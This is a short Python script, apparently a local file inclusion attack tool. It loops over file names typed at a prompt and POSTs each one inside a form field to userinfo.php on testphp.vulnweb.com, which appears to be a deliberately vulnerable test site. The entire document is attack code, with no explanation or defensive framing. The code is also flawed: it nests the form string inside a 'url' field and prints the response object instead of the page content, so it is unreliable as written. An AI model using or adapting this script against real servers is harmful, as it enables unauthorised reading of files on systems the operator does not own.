import requests
from cmd import Cmd

url = 'http://testphp.vulnweb.com/userinfo.php'
url_var = 'url'
class termnal(Cmd):
	
	prompt = "Please Type =>"

	def default(self, line):
		print(get_source(line))
		
def get_source(file_name):
	lfi = f"uname=test&pass={file_name}"
	data= {url_var:lfi}
	 
	try:
		req = requests.post(url,data=data)
		
		return req
	except:
		return False	
	
if __name__ == '__main__':
	termnal().cmdloop()		